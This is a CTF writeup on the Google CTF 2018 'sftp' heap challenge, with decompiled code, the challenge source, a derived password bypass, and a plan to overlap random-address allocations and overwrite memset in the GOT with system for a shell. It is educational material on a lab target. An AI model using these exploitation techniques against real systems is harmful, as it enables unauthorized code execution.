# Two Pwns One Chall - A Google CTF 2018 Quals Writeup

## Introduction

Avid readers of my CTF writeup git repo (population: zero) will not find it surprising that this is a writeup of yet another heap exploitation challenge.

However, it comes with a twist: it doesn't actually have anything to do with the ptmalloc allocator or any known allocator per se. At least, that was the original intention of the challenge. However, interestingly enough, the same exact challenge IS exploitable under ptmalloc as well! This didn't matter for the CTF, but I found it funny. Therefore, in this writeup I explain two exploits: the one we created for the CTF and one I wrote afterwards for ptmalloc.

Besides the technical details of the solution, I will highlight the pitfalls I fell into that ended up being timesinks during the challenge. I find this to be a very typical thing when doing CTFs. Challenges more often than not present you with several paths to go down and making the right decisions seem to be the most critical component to the speed at which you solve a challenge. Me being me, I once again managed to maximize the time spent in all the wrong places, of course! Maybe you learn something from it, or, at least, get a laught out of it.

## The SFTP Service

The challenge itself is a (fairly) simple file transfer protocol service. It starts with an authentication step (we'll get to that in a minute) and then runs a straightforward command processing loop:

```
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  int stderr_; // edi

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  stderr_ = (signed int)stderr;
  setbuf(stderr, 0LL);
  if ( (unsigned __int8)auth(stderr_, 0LL) )    // super serious crypto
    return 0LL;
  __printf_chk(1, "Connected to %s.\n", sftp_server_name);// "sftp.google.ctf"
  while ( (unsigned __int8)handle_command() )
    ;
  return 0LL;
}
```

The service implements basic commands, helpfully shown by the help command:

```
  if ( !memcmp(input_line, "help", 4uLL) )
  {
    puts("Available commands:");
    puts("bye                                Quit sftp");
    puts("cd path                            Change remote directory to 'path'");
    puts("get remote                         Download file");
    puts("ls [path]                          Display remote directory listing");
    puts("mkdir path                         Create remote directory");
    puts("put local                          Upload file");
    puts("pwd                                Display remote working directory");
    puts("quit                               Quit sftp");
    puts("rm path                            Delete remote file");
    puts("rmdir path                         Remove remote directory");
    puts("symlink oldpath newpath            Symlink remote file");
    result = 1LL;
    goto STACK_COOKIE;
  }
```

The binary doesn't contain any obfuscation, nothing particularly interesting about the reversing process... except for a couple things. But before we get there, we have to get past the authentication.

## Password Based Authentication

Connecting to the service presents us with:

```
The authenticity of host 'sftp.google.ctf (3.13.3.7)' can't be established.
ECDSA key fingerprint is SHA256:+d+dnKGLreinYcA8EogcgjSF3yhvEBL+6twxEc04ZPq.
Are you sure you want to continue connecting (yes/no)? 
Warning: 
Permanently added 'sftp.google.ctf' (ECDSA) to the list of known hosts.
c01db33f@sftp.google.ctf's password:
```

So we have to guess a password? Looking at the auth() function, it is pretty straightforward: it will XOR a magic short with the password as a bytestream and then allow us in if we end up with the right magic result:

```
__printf_chk(1, "%s@%s's password: ", username_codebeef, sftp_server_name);
  if ( !(unsigned int)__isoc99_scanf("%15s", pwd) )
    return 0LL;
  chr = _IO_getc(stdin);
  LOWORD(chr) = pwd[0];
  if ( !pwd[0] )
    return 0LL;
  magic = 0x5417;
  do
  {
    chr ^= magic;
    ++input_;
    magic = 2 * chr;
    LOWORD(chr) = *input_;
  }
  while ( (_BYTE)chr );
  result = 1LL;
  if ( (_WORD)magic != 0x8DFAu )
    return 0LL;
  return result;
```

Seeing this, I could have done one of two things: either figure this out, or just patch out the authentication step (as it has no side-effect at all for the rest of the program) and start dealing with the exploitation part while I wait for somebody smarter in the team to figure this out for me. Surprisingly enough, in this case I managed to chose the more efficient option and indeed I was given a helping hand by the incomparable @kockztamas. Here's how we solved this:

First we can see that the initial `hash` value does not really matter if we supply a long enough password as `hash` will shifted out and only our password characters (which are xored with the hash) will be used.So if we select a character pair (`$` and `H`) which nullify each other, eg. if password use '$', 'H' characters alternately (`$H$H$H$H$H$H$H`) then the resulting `hash` value will be 0.

```
'$' = 00100100
'H' = 01001000 = '$' << 1
('$' << 1) | 'H' = 0
```

These two characters are also ASCII, so we won't have any problem to send them to the program.Now our job is to create 36346 (0x8dfa) via bitflipping our base $H pattern:

```
0x8dfa = 10001101 11111010
          $H$H$H$ H$H$H$H
           H$I%H% I%I%I$I
           ```

The MSB character is a bit special, because we used only a 14 character long input and the MSB bit of the initial hash value `0x5417` is 1 and it still has effect, so the MSB character of the password will be `$` instead of the expected `%`. Thus the following password bypasses the check: `$H$I%H%I%I%I$I`


## A "Sophisticated" Heap

First of all - the challenge description hints that there will be a custom heap implementation!

```
This file server has a sophisticated malloc implementation designed to thwart traditional heap exploitation techniques...
```

Sounds exciting! Let's find it - some reversing is in order, then.

As we start reversing the code, it becomes quickly apparent that there are a ton of unused functions, while at the same time the main code is full of inlined versions of the same functionality. Makes reversing the main command loop pretty annoying.

More importantly, among the functions we find... malloc, free, and realloc. All right, let's see them!

```
signed __int64 malloc()
{
  return rand() & 0x1FFFFFFF | 0x40000000LL;
}

void free()
{
  ;
}

__int64 __fastcall realloc(__int64 a1)
{
  return a1;
}
```

What? That's ... simple. Also, more than this custom "allocator" being so simple, it makes something else clear: why all the inlining happened. It should be no surprise that we won't find calls to realloc and free, since the compiler likely removed invocations of NOP functions. And even the malloc implementation being this simple, it would probably just get inlined. Indeed, this is what we find quickly in several places, e.g. here's a snippet from the function `find_entry`:

```
MALLOC_NEW_ENTRY:
  child_ = (entry_t *)(rand() & 0x1FFFFFFF | 0x40000000LL);// *child = malloc(sizeof(entry))
  *child_arr = child_;
  child_->parent_directory = (__int64)parent;
  child_->type = 0;                             // INVALID_ENTRY
  strcpy(child_->name, name);
```

I'm not exactly sure what linking steps the challenge author had to take in order to make sure that despite also being inlined, the various functions remain in the binary as well. I didn't figure this out mostly because it was completely unnecessary for solving the challenge.

But wait, nevermind it being simple - this is just completely wrong, right?! After all if the realloc is a NOP, then naturally it would result in overflows whereever it is actually used. What's worse, the malloc returning a random address is obviously insecure, since nothing apart from chance seems to be standing in the way of creating overlapping allocations.

But nevermind that - this obviously can not even "just work" like this, can it?! How would `rand() & 0x1FFFFFFF | 0x40000000LL` be returning valid (mapped) memory addresses? Clearly, we are missing something here. There has to be some custom code BEFORE the main() is executed.

More reversing is needed and we have to look for something before main. You would immediately assume that something was put into the `init_array` and of course if we look at the start function, we find this is the case indeed:

```
.text:0000000000001070                                         public start
.text:0000000000001070                         start           proc near               ; DATA XREF: LOAD:0000000000000018↑o
.text:0000000000001070                         ; __unwind {
.text:0000000000001070 31 ED                                   xor     ebp, ebp
.text:0000000000001072 49 89 D1                                mov     r9, rdx         ; rtld_fini
.text:0000000000001075 5E                                      pop     rsi             ; argc
.text:0000000000001076 48 89 E2                                mov     rdx, rsp        ; ubp_av
.text:0000000000001079 48 83 E4 F0                             and     rsp, 0FFFFFFFFFFFFFFF0h
.text:000000000000107D 50                                      push    rax
.text:000000000000107E 54                                      push    rsp             ; stack_end
.text:000000000000107F 4C 8D 05 4A 20 00 00                    lea     r8, fini        ; fini
.text:0000000000001086 48 8D 0D D3 1F 00 00                    lea     rcx, init       ; init
.text:000000000000108D 48 8D 3D 6C FF FF FF                    lea     rdi, main       ; main
.text:0000000000001094 FF 15 46 3F 20 00                       call    cs:__libc_start_main_ptr
.text:000000000000109A F4                                      hlt
.text:000000000000109A                         ; } // starts at 1070
.text:000000000000109A                         start           endp
```

```
void __fastcall init(unsigned int a1, __int64 a2, __int64 a3)
{
  __int64 v3; // r13
  signed __int64 v4; // rbp
  __int64 v5; // rbx

  v3 = a3;
  v4 = &off_204DF0 - init_array;
  init_proc();
  if ( v4 )
  {
    v5 = 0LL;
    do
      ((void (__fastcall *)(_QWORD, __int64, __int64))init_array[v5++])(a1, a2, v3);
    while ( v4 != v5 );
  }
}
```

```
.init_array:0000000000204DD8 70 11 00 00 00 00 00 00+init_array      dq offset init_1, offset init_heap, offset init_filesystem
.init_array:0000000000204DD8 70 0E 00 00 00 00 00 00+                                        ; DATA XREF: LOAD:00000000000000F8↑o
.init_array:0000000000204DD8 C0 0E 00 00 00 00 00 00                                         ; LOAD:0000000000000210↑o ...
.init_array:0000000000204DD8                         _init_array     ends
```

Well, look at that ("init_heap" and "init_filesystem" named by me). The first function is nothing interesting, but in `init_heap` we found what we were looking for:

```
void init_heap()
{
  unsigned int seed; // eax

  if ( mmap((void *)0x40000000, 0x200FFFFFuLL, 3, 50, -1, 0LL) != (void *)0x40000000 )
    abort();
  seed = time(0LL);
  srand(seed);
}
```

Ok, so we map that entire range within which we pick random addresses for each allocation, without any regard to the requested allocation size. This gives us an idea for what we want to do: achieve overlapping allocations of ... some objects ... where we can control the content of one and gaining control of the other we can turn into RCE. For a program implementing an in-memory filesystem it sounds reasonable that we could get objects of both kinds after all.

Of course, we would first have to reverse engineer the implementation details enough to understand the type of objects that are in play. So without further ado off I went, reversing the binary in IDA. And that... took me to the first pitfall where I wasted many hours pointlessly.

## Pitfall #1: Use The Source, Luke!

Instead of diving into the main function in IDA, I should have just ... ran the program. Because, in fact, the filesystem isn't empty when we start. Instead, we have this:

```
kutyacica@ubuntu:~/Desktop/GCTF18$ python expl.py 
[+] Opening connection to sftp.ctfcompetition.com on port 1337: Done
The authenticity of host 'sftp.google.ctf (3.13.3.7)' can't be established.
ECDSA key fingerprint is SHA256:+d+dnKGLreinYcA8EogcgjSF3yhvEBL+6twxEc04ZPq.
Are you sure you want to continue connecting (yes/no)? 
Warning: 
Permanently added 'sftp.google.ctf' (ECDSA) to the list of known hosts.
c01db33f@sftp.google.ctf's password: Connected to sftp.google.ctf.

sftp> 
[*] Switching to interactive mode
$ ls
flag
src
sftp> $ get flag
12
Nice try ;-)
sftp> $ cd src
sftp> $ ls
sftp.c
sftp> $ get sftp.c
14910
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
(...)
sftp> $  
```

Oh yes, the default created filesystem contained not only a false flag file, but also a src directory with the ACTUAL source code of the challenge! Here it is, for completeness:

```
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include "secure_allocator.h"

void readn(char* buf, size_t buf_len) {
  while (buf_len) {
    int result = fread(buf, 1, buf_len, stdin);
    if (result < 0) {
      abort();
    }
    buf += result;
    buf_len -= result;
  }
}

void writen(char* buf, size_t buf_len) {
  while (buf_len) {
    int result = fwrite(buf, 1, buf_len, stdout);
    if (result < 0) {
      abort();
    }
    buf += result;
    buf_len -= result;
  }
}

////////////////////////////////////////////////////////////////////////////////
// Handle authentication to the server
////////////////////////////////////////////////////////////////////////////////

char* user_name = "c01db33f";
char* host_name = "sftp.google.ctf";

bool authenticate_user() {
  char password[16];
  uint16_t hash = 0x5417;
  printf("%s@%s's password: ", user_name, host_name);
  if (scanf("%15s", password)) {
    getc(stdin);
    for (char* ptr = password; *ptr; ++ptr) {
      hash ^= *ptr;
      hash <<= 1;
    }
    if (hash == 36346) {
      return true;
    }
  }
  return false;
}

bool authenticate_server() {
  char response[4];
  printf(
      "The authenticity of host '%s (3.13.3.7)' can't be "
      "established.\n",
      host_name);
  printf(
      "ECDSA key fingerprint is "
      "SHA256:+d+dnKGLreinYcA8EogcgjSF3yhvEBL+6twxEc04ZPq.\n");
  printf("Are you sure you want to continue connecting (yes/no)? ");
  if (scanf("%3s", response) && !strcmp(response, "yes")) {
    printf(
        "Warning: Permanently added '%s' (ECDSA) to the list of "
        "known hosts.\n",
        host_name);
    return true;
  }
  return false;
}

bool authenticate() { return authenticate_server() && authenticate_user(); }

////////////////////////////////////////////////////////////////////////////////
// Handle the backing filesystem
////////////////////////////////////////////////////////////////////////////////

#define path_max 4096
#define name_max 20
#define file_max 65535

typedef struct entry entry;
typedef struct directory_entry directory_entry;
typedef struct file_entry file_entry;
typedef struct link_entry link_entry;
typedef struct link_table_entry link_table_entry;

enum entry_type {
  INVALID_ENTRY        = 0x0,
  DIRECTORY_ENTRY      = 0x1,
  FILE_ENTRY           = 0x2,
  LINK_ENTRY           = 0x4,
  DIRECTORY_LINK_ENTRY = DIRECTORY_ENTRY | LINK_ENTRY,
  FILE_LINK_ENTRY      = FILE_ENTRY | LINK_ENTRY,
};

struct entry {
  struct directory_entry* parent_directory;
  enum entry_type type;
  char name[name_max];
};

struct directory_entry {
  struct entry entry;

  size_t child_count;
  struct entry* child[];
};

struct file_entry {
  struct entry entry;

  size_t size;
  char* data;
};

struct link_entry {
  struct entry entry;

  struct entry* target;
};

directory_entry* root = NULL;
directory_entry* pwd = NULL;

bool is_absolute_path(char* path) { return (strlen(path) && path[0] == '/'); }

size_t entry_path_len(entry* ptr) {
  size_t path_len = 0;
  while (ptr) {
    path_len += strlen(ptr->name) + 1;
    ptr = (entry*)ptr->parent_directory;
  }
  return path_len;
}

void entry_path(entry* ptr, char* path) {
  char* path_ptr = &path[path_max - 1];
  memset(path, 0, path_max);
  while (ptr) {
    size_t name_len = strlen(ptr->name) + 1;
    if (path_ptr - name_len < path) {
      return;
    }
    path_ptr -= name_len;
    memcpy(path_ptr, ptr->name, name_len);
    *--path_ptr = '/';
    ptr = (entry*)ptr->parent_directory;
  }
  memmove(path, path_ptr, strlen(path_ptr));
}

entry* find_entry(char* path);
void delete_entry(entry* entry);
entry** new_entry(char* path);
directory_entry* find_directory(char* path);
file_entry* find_file(char* path);
link_entry* find_link(char* path);
directory_entry* new_directory(char* path);
file_entry* new_file(char* path);
link_entry* new_link(char* path);

entry* find_entry(char* path) {
  directory_entry* dir = pwd;
  char path_copy[path_max];
  strcpy(path_copy, path);
  path = path_copy;

  if (!strncmp(path, "/home/", 6)) {
    dir = root;
    path += 5;
  }

  char* name = strtok(path, "/");
  if (!name) {
    name = path;
  }

  size_t i = 0;
  while (i < dir->child_count) {
    if (dir->child[i] && !strcmp(dir->child[i]->name, name)) {
      name = strtok(NULL, "/");
      if (!name) {
        return dir->child[i];
      } else if (dir->child[i]->type == DIRECTORY_ENTRY) {
        dir = (directory_entry*)dir->child[i];
        i = 0;
        continue;
      } else if (dir->child[i]->type == DIRECTORY_LINK_ENTRY) {
        dir = (directory_entry*)((link_entry*)dir->child[i])->target;
        i = 0;
        continue;
      }
    }
    ++i;
  }

  return NULL;
}

void update_directory_links(directory_entry* dir, entry* old, entry* new) {
  for (size_t i = 0; i < dir->child_count; ++i) {
    entry* child = dir->child[i];
    if (child) {
      if (child->type & LINK_ENTRY) {
        link_entry* link = (link_entry*)child;
        if (link->target == old) {
          link->target = new;
        }
      } else if (child->type == DIRECTORY_ENTRY) {
        update_directory_links((directory_entry*)child, old, new);
      }
    }
  }
}

void update_links(entry* old, entry* new) {
  update_directory_links(root, old, new);
}

void delete_entry(entry* entry) {
  directory_entry* parent = entry->parent_directory;
  for (size_t i = 0; i < parent->child_count; ++i) {
    if (parent->child[i] == entry) {
      parent->child[i] = NULL;
      break;
    }
  }

  update_links(entry, NULL);
  free(entry);
}

entry** new_entry(char* path) {
  char path_copy[path_max];
  char* name = NULL;
  strcpy(path_copy, path);
  path = path_copy;

  name = strrchr(path, '/');
  if (!name) {
    name = path;
    path = NULL;
  } else {
    *name++ = 0;
  }

  directory_entry* parent = find_directory(path);
  entry** child = NULL;
  for (size_t i = 0; i < parent->child_count; ++i) {
    if (!parent->child[i]) {
      child = &parent->child[i];
      break;
    }
  }

  if (!child) {
    directory_entry* new_parent = realloc(parent, sizeof(directory_entry) + (parent->child_count * 2 * sizeof(entry*)));
    if (parent != new_parent) {
      update_links((entry*)parent, (entry*)new_parent);
      parent = new_parent;
    }

    for (size_t i = 0; i < parent->child_count; ++i) {
      parent->child[i]->parent_directory = parent;
    }

    child = &parent->child[parent->child_count];
    parent->child_count *= 2;
  }

  *child = malloc(sizeof(entry));
  (*child)->parent_directory = parent;
  (*child)->type = INVALID_ENTRY;
  strcpy((*child)->name, name);

  if (entry_path_len(*child) >= path_max) {
    delete_entry(*child);
    child = NULL;
  }

  return child;
}

directory_entry* find_directory(char* path) {
  if (!path) {
    return pwd;
  }

  entry* entry = find_entry(path);

  if (entry && entry->type == DIRECTORY_LINK_ENTRY) {
    entry = ((link_entry*)entry)->target;
  } else if (entry && entry->type != DIRECTORY_ENTRY) {
    entry = NULL;
  }

  return (directory_entry*)entry;
}

file_entry* find_file(char* path) {
  entry* entry = find_entry(path);

  if (entry && entry->type == FILE_LINK_ENTRY) {
    entry = ((link_entry*)entry)->target;
  } else if (entry && entry->type != FILE_ENTRY) {
    entry = NULL;
  }

  return (file_entry*)entry;
}

link_entry* find_link(char* path) {
  entry* entry = find_entry(path);

  if (entry && (entry->type & LINK_ENTRY) == 0) {
    entry = NULL;
  }

  return (link_entry*)entry;
}

directory_entry* new_directory(char* path) {
  directory_entry* dir = NULL;
  entry** child = new_entry(path);

  dir = realloc(*child, sizeof(directory_entry) + 16 * sizeof(entry*));
  dir->entry.type = DIRECTORY_ENTRY;
  dir->child_count = 16;
  memset(dir->child, 0, 16 * sizeof(entry*));

  return dir;
}

file_entry* new_file(char* path) {
  file_entry* file = NULL;
  entry** child = new_entry(path);

  file = realloc(*child, sizeof(file_entry));
  file->entry.type = FILE_ENTRY;
  file->size = 0;

  return file;
}

link_entry* new_link(char* path) {
  link_entry* link = NULL;
  entry** child = new_entry(path);

  link = realloc(*child, sizeof(link_entry));
  link->entry.type = LINK_ENTRY;
  link->target = NULL;

  return link;
}

#include "filesystem.h"

////////////////////////////////////////////////////////////////////////////////
// Handle the user commands
////////////////////////////////////////////////////////////////////////////////

bool handle_bye() { exit(0); }

bool handle_cd(char* path) {
  directory_entry* dir = find_directory(path);
  if (!dir) {
    printf("Couldn't stat remote file: No such file or directory\n");
  } else {
    pwd = dir;
  }
  return true;
}

bool handle_get(char* path) {
  file_entry* file = find_file(path);
  if (file) {
    printf("%zu\n", file->size);
    writen(file->data, file->size);
  } else {
    printf("File \"%s\" not found.\n", path);
  }

  return true;
}

bool handle_help() {
  printf("Available commands:\n");
  printf("bye                                Quit sftp\n");
  printf(
      "cd path                            Change remote directory to 'path'\n");
  printf("get remote                         Download file\n");
  printf(
      "ls [path]                          Display remote directory listing\n");
  printf("mkdir path                         Create remote directory\n");
  printf("put local                          Upload file\n");
  printf(
      "pwd                                Display remote working directory\n");
  printf("quit                               Quit sftp\n");
  printf("rm path                            Delete remote file\n");
  printf("rmdir path                         Remove remote directory\n");
  printf("symlink oldpath newpath            Symlink remote file\n");
  return true;
}

bool handle_ls(char* path) {
  directory_entry* dir = pwd;
  if (path) {
    dir = find_directory(path);
  }

  if (dir) {
    for (size_t i = 0; i < dir->child_count; ++i) {
      if (dir->child[i]) {
        printf("%s\n", dir->child[i]->name);
      }
    }
  } else {
    printf("Can't ls: \"%s\" not found\n", path);
  }

  return true;
}

bool handle_mkdir(char* path) {
  directory_entry* dir = NULL;
  entry* existing_entry = find_entry(path);
  if (!existing_entry) {
    dir = new_directory(path);
  }

  if (!dir) {
    printf("Couldn't create directory: Failure\n");
  }

  return true;
}

bool handle_put(char* path) {
  file_entry* file = NULL;
  entry* existing_entry = find_entry(path);
  if (existing_entry) {
    file = find_file(path);
  } else {
    file = new_file(path);
  }

  if (file) {
    char input_line[16];
    if (fgets(input_line, sizeof(input_line), stdin)) {
      size_t size;
      sscanf(input_line, "%zu", &size);
      if (file->size < size && size <= file_max) {
        file->data = malloc(size);
        file->size = size;
      } else if (file->size >= size) {
        memset(file->data, 0, size);
        file->size = size;
      } else {
        file->data = NULL;
        file->size = 0;
      }
      readn(file->data, file->size);
    }
  } else {
    printf("remote open(\"%s\"): No such file or directory\n", path);
  }

  return true;
}

bool handle_pwd() {
  char path[path_max];
  entry_path((entry*)pwd, path);
  printf("Remote working directory: %s\n", path);
  return true;
}

bool handle_rm(char* path) {
  link_entry* link = find_link(path);
  if (link) {
    delete_entry((entry*)link);
  } else {
    file_entry* file = find_file(path);
    if (file) {
      delete_entry((entry*)file);
    } else {
      printf("Couldn't remove file: No such file or directory\n");
    }
  }

  return true;
}

bool handle_rmdir(char* path) {
  directory_entry* dir = find_directory(path);
  if (dir) {
    delete_entry((entry*)dir);
  } else {
    printf("Couldn't remove directory: No such file or directory\n");
  }

  return true;
}

bool handle_symlink(char* src_path, char* path) { 
  link_entry* link = NULL;
  entry* target = find_entry(src_path);
  entry* existing_entry = find_entry(path);
  if (!existing_entry) {
    link = new_link(path);
  } else if (existing_entry->type & LINK_ENTRY) {
    link = (link_entry*)existing_entry;
  }

  if (link) {
    link->target = target;
    if (target && target->type == DIRECTORY_ENTRY) {
      link->entry.type = DIRECTORY_LINK_ENTRY;
    } else if (target && target->type == FILE_ENTRY) {
      link->entry.type = FILE_LINK_ENTRY;
    } else {
      link->entry.type = LINK_ENTRY;
    }
  } else {
    printf("Couldn't symlink \"%s\" to \"%s\": No such file or directory\n", src_path, path);
  }

  return true;
}

bool handle_invalid_command() {
  printf("Invalid command.\n");
  return true;
}

bool handle_command() {
  char input_line[10 + path_max + path_max];
  char src_path[path_max];
  char dst_path[path_max];

  printf("sftp> ");

  if (fgets(input_line, sizeof(input_line), stdin)) {
    if (!strncmp(input_line, "bye", 3)) {
      return handle_bye();
    } else if (!strncmp(input_line, "cd", 2)) {
      if (0 <= sscanf(input_line, "cd %4095s", dst_path)) {
        return handle_cd(dst_path);
      }
    } else if (!strncmp(input_line, "get", 3)) {
      if (0 <= sscanf(input_line, "get %4095s", dst_path)) {
        return handle_get(dst_path);
      }
    } else if (!strncmp(input_line, "help", 4)) {
      return handle_help();
    } else if (!strncmp(input_line, "ls", 2)) {
      if (0 <= sscanf(input_line, "ls %4095s", dst_path)) {
        return handle_ls(dst_path);
      }
      return handle_ls(NULL);
    } else if (!strncmp(input_line, "mkdir", 5)) {
      if (0 <= sscanf(input_line, "mkdir %4095s", dst_path)) {
        return handle_mkdir(dst_path);
      }
    } else if (!strncmp(input_line, "put", 3)) {
      if (0 <= sscanf(input_line, "put %4095s", dst_path)) {
        return handle_put(dst_path);
      }
    } else if (!strncmp(input_line, "pwd", 3)) {
      return handle_pwd();
    } else if (!strncmp(input_line, "quit", 4)) {
      return handle_bye();
    } else if (!strncmp(input_line, "rmdir", 5)) {
      if (0 <= sscanf(input_line, "rmdir %4095s", dst_path)) {
        return handle_rmdir(dst_path);
      }
    } else if (!strncmp(input_line, "rm", 2)) {
      if (0 <= sscanf(input_line, "rm %4095s", dst_path)) {
        return handle_rm(dst_path);
      }
    } else if (!strncmp(input_line, "symlink", 7)) {
      if (0 <=
          sscanf(input_line, "symlink %4095s %4095s", src_path, dst_path)) {
        return handle_symlink(src_path, dst_path);
      }
    }

    return handle_invalid_command();
  }

  return false;
}

void service_main() {
  if (authenticate()) {
    printf("Connected to %s.\n", host_name);
    while (handle_command())
      ;
  }
}

int main() {
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  service_main();
  
  return 0;
}
```

Obviously, the setup of the initial filesystem (assigning `root`, `pwd` as well as creating the flag file and `src/sftp.c`) has to happen somewhere. This part is not in the source code. In the binary, this is what the `init_filesystem()` function in the `init_array` did. Here is the reversed pseudocode, it is pretty self explanatory:

```
char *init_filesystem()
{
  file_entry *flag_obj; // rbx
  size_t flag_size__; // rax
  int v2; // eax
  size_t flag_size_; // rdx
  char *flag_addr; // rdi
  unsigned __int64 v5; // rax
  char *v6; // rdx
  file_entry *srcfile_obj; // rbx
  size_t srcfile_size_; // rax
  int v9; // eax
  size_t srcfile_size; // rdx
  char *srcfile_addr; // rdi
  char *result; // rax
  char *v13; // rdx

  g_home_folder_obj.entry.parent_directory = 0LL;
  strcpy(g_home_folder_obj.entry.name, "home");
  g_root = &g_home_folder_obj;
  g_home_folder_obj.child_count = 1LL;
  g_home_folder_obj.child[0] = 0LL;
  g_pwd = &g_home_folder_obj;
  g_pwd = init_new_directory(username_codebeef);
  flag_obj = *new_entry("flag");                // 
                                                // 
                                                // create the file "flag"
                                                // which is actually just a red herring string
                                                // and store it in memory, but XORd with 0x89.
  flag_size__ = flag_size_0xC;
  flag_obj->entry.type = 2;
  flag_obj->size = flag_size__;
  v2 = rand();
  flag_size_ = flag_size_0xC;
  flag_addr = (char *)(v2 & 0x1FFFFFFF | 0x40000000LL);
  flag_obj->data = flag_addr;
  memcpy(flag_addr, flag_default_value, flag_size_);
  if ( flag_obj->size )
  {
    v5 = 0LL;
    do
    {
      v6 = &flag_obj->data[v5++];
      *v6 ^= 0x89u;
    }
    while ( flag_obj->size > v5 );
  }
  init_new_directory("src");
  srcfile_obj = *new_entry("src/sftp.c");
  srcfile_size_ = g_srcfile_size;
  srcfile_obj->entry.type = 2;
  srcfile_obj->size = srcfile_size_;
  v9 = rand();
  srcfile_size = g_srcfile_size;
  srcfile_addr = (char *)(v9 & 0x1FFFFFFF | 0x40000000LL);// 
                                                // 
                                                // malloc call
  srcfile_obj->data = srcfile_addr;
  result = (char *)memcpy(srcfile_addr, &srcfile_content, srcfile_size);// 
                                                // 
                                                // same with flag, XOR the src/sftp.c
                                                // before it into memory. in this case,
                                                // this "decrypted version" is the ACTUAL
                                                // source code...
  if ( !srcfile_obj->size )
    return result;
  result = 0LL;
  do
  {
    v13 = &(result++)[(unsigned __int64)srcfile_obj->data];
    *v13 ^= 0x37u;
  }
  while ( srcfile_obj->size > (unsigned __int64)result );
  return result;
}
```

In fact, I did check this... but after seeing that the flag file was simply a red herring, I (stupidly) decided that the source file has to be a red herring too and didn't bother looking. So I wasted a few hours to reach these simple conclusions about the filesystem implementation instead of getting there using the source in minutes:

 * the filesystem is in-memory only, no real filesystem backing. This was fairly obvious right away, seeing the lack of filesystem manipulation imports from libc in the binary (e.g. open is not used anywhere) 
 * same entry structure is used for all filesystem objects. This has a parent pointer field, a type field, and an inline char array that is the name
 * the three types of filesystem objects (file, directory, link) all extend this base entry type with type-specific fields; for the link it is a link pointer, for files it is a length field and a data pointer; for directories it is an inline array of children pointers, which is 16 long by default and is extended by `realloc()` as necessary.
 * no limitation on number of operations we can make, number of files/directories/links we can have, etc.
 * the `put` command writes the new content into the existing data object IF the new size is not larger than the old size, otherwise it simply throws the old one away and allocates a new data object


## A Simple Plan For A Simple Filesystem

Now that we understand the filesystem implementation and know that allocation overlaps can occur, a fairly straightforward plan emerges. 

If we could overlap a `file_entry_t` type with a data object, we could detect that overlap happening bceause the inline name array of the file entry object would get clobbered, which would be visible by calling an `ls` command on the containing directory, which only uses the (inline) name member of file objects, but not their data pointer fields (meaning that the fact that the overlap has clobbered the data pointer would not be a problem).

Secondly, once we know an overlap occured, we could also immediately know the exact offset from the start of the overlapping data object to the beginning of the overlap simply by counting the number of marker characters that are printed our when invoking `ls`. That is because the command prints until the first null byte, irrespective of this going beyond 20 bytes (normal length of a name).

Lastly, once we know exactly how a data object overlaps a file object, we can modify through the `put` command the data object so that it turns the file object into one with a data pointer to an arbitrary address, which indirectly would give us an arbitrary read-write primitive. What is more, since we know that the heap area has the entire `0x40000000 -> 0x40000000+0x200FFFFF` range mapped, we won't run into any invalid addresses, we can simply scan this range for the other objects, such as the root directory object, which gives us a pointer to BSS, from which we would know the GOT address, at which point we can fully read/write the GOT, so clearly we would win. In fact, we have a pretty easy path to victory here, as we can target the `memset` in the GOT, which in the case of a `put` command will get called on a pointer first argument that we fully control the contents of (a data object). Therefore turning `memset` into `system` finishes the job.

(Sidebar: it is worth mentioning this plan isn't exactly flawless, as we can also by accident trigger a different type of overlap (file-to-file or even file-to-directory) or even trigger the directory realloc corruption overwriting a file entry. All these have smaller chances of occuring, in practice it didn't matter much at all, but it does make the exploit less than 100% reliable if we are being pedantic. In a jeopardy format CTF, this didn't matter of course.)

There is just one problem: we don't know how lucky we would need to get in order to stumble upon an overlap occuring.

## You've Got To Ask Yourself One Question: Do I Feel lucky?

So, I was also wondering, how "random" are the allocation addresses going to be? After all, we are seeding srand with time() - is the challenge trying to tell us we are supposed to be beating MORE bad crypto here? Or perhaps there will be additional vulnerabilities in the actual command implementations as well that we would need to complete an exploit, instead of having to rely on chance? Or will this really be an otherwise flawless program which is to be pwned solely due to this "sophisticated" malloc implementation?

So the question was: do I keep looking for bugs to make this thing completely deterministic or do I take the "overlap by chance" primitive and run with it?

And THAT... took me to the second pitfall where I wasted many more hours somewhat pointlessly.

## Pitfall #2: All I Want For My Birthday Is A Collision

When I first considered the chances of an overlap, unfortunately, with one quick look at `0x1FFFFFFF` I concluded that 29 bits of randomness on a uniform distribution is going to be way too many to get an overlap in a reasonable amount of tries, therefore we will need something else. I considered the fact that srand is being seeded by time, but I decided that even if we assumed that we knew the exact addresses that we were getting, the only question that mattered was the distribution of them, since we needed an overlap.

So I proceeded from here to spend a lot of time looking for ways to achieve an overlap without any need for bruteforcing it. Eventually, of course, I did realize how likely this actually is. Of course this happened when I ran out of other ideas, tried a bruteforce in an endless loop just in case... and then to my surprise found how very very quickly I got lucky every time. So let's go through why that is.

We can state the problem as: how many of each type of allocations do we need to make in order to make sure that with a probability over 50% we will get at least one file object allocation end up sharing the same 16 pages of memory with a data allocation. And in fact the birthday problem tells us that in this case, being left with 29-16 bits, we can about half the remainder, meaning that with 100-200 tries we should be almost certain to get a hit. Since the binary has no alarm or limitation on number of the filesystem operations we can make or limitation on the number of filesystem items we can create, this should be easy enough. In fact, these odds are so good, that I decided to optimize a different way and only used allocations of page size (0x1000) instead of (almost) 16 page sizes (0xFFFF). This is useful both for following alignment easier, but more so because this way we send a lot less data across the network each time. Since we have the squareroot property of the birthday problem working for us, we get better performance out of this, all things considered.

(A sidenote for completeness: we are actually running into the generalized version of the birthday problem as described [here](https://en.wikipedia.org/wiki/Birthday_problem#Generalization_to_multiple_types). Technically, the reduction isn't the same, e.g. while the magic number is 23 for the normal birthday problem, it is 34 for the two-group generic variant. Nonetheless, what matters is that we more-or-less get a squareroot reduction on the size still. In the end, with page size allocations, we could expect close to 100% success rate with less than 500 allocation attempts.)

At this point, our exploit is basically ready to be finished. We expect to get an overlap with a pretty low number of tries and the rest is straightforward. Sure enough, I soon had a working version locally, giving me a shell after I accounted for the offset difference in libc from `memset` to `system`.

